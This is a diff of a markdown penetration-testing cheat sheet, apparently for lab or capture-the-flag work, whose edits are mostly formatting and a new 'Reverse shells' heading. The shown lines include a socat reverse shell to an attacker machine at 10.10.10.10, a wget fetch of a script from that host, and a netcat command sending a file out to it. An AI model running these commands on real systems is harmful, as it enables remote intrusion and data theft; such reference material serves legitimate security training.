@@ -15,7 +15,9 @@ Victim: ```wget http://10.10.10.10:8888/something.sh -O something.sh```
 ### With Socat
 
 Victim: ```wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat```
+
         ```chmod +x socat```
+        
         ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444```
         
 Kali:   ```socat file:`tty`,raw,echo=0 tcp-listen:4444```
@@ -30,14 +32,16 @@ Victim: ```python3 -c 'import pty; pty.spawn("/bin/sh")'```
 
 Kali:   ```nc -lvp 4444 > file.txt```
 
-Victim: ```cat file.txt | nc -q 0 10.10.10.10 4444 ````
+Victim: ```cat file.txt | nc -q 0 10.10.10.10 4444```
 
-## 
+## Reverse shells 
+
+
 # Enumeration
 
 > Enumeration is the most important thing you can do, at that inevitable stage where you find yourself hitting a wall, 90% of the time it will be because you haven’t done enough enumeration
 
-## Nmap
+### Nmap
 
 TCP Scan:
 
